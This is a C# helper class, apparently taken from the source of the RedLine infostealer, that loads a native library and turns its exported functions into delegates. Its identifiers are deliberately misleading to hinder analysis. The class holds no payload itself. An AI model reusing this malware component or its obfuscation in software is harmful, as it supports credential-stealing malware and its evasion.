using System;
using System.Runtime.InteropServices;

namespace RedLine.Logic.Helpers
{
  public sealed class LibInvoker : IDisposable
  {
    private IntPtr SystemNetMailSmtpNtlmAuthenticationModuleC;

    public LibInvoker(string fileName)
    {
      this.SystemNetMailSmtpNtlmAuthenticationModuleC = NativeMethods.LoadLibrary(fileName);
      if (!(this.SystemNetMailSmtpNtlmAuthenticationModuleC == IntPtr.Zero))
        return;
      Marshal.ThrowExceptionForHR(Marshal.GetHRForLastWin32Error());
    }

    public TDelegate CastToDelegate<TDelegate>(
      string MicrosoftWinTimerElapsedEventHandlerKtionName)
      where TDelegate : class
    {
      IntPtr procAddress = NativeMethods.GetProcAddress(this.SystemNetMailSmtpNtlmAuthenticationModuleC, MicrosoftWinTimerElapsedEventHandlerKtionName);
      if (procAddress == IntPtr.Zero)
        return default (TDelegate);
      return Marshal.GetDelegateForFunctionPointer(procAddress, typeof (TDelegate)) as TDelegate;
    }

    public void Dispose()
    {
      if (!(this.SystemNetMailSmtpNtlmAuthenticationModuleC != IntPtr.Zero))
        return;
      NativeMethods.FreeLibrary(this.SystemNetMailSmtpNtlmAuthenticationModuleC);
    }
  }
}
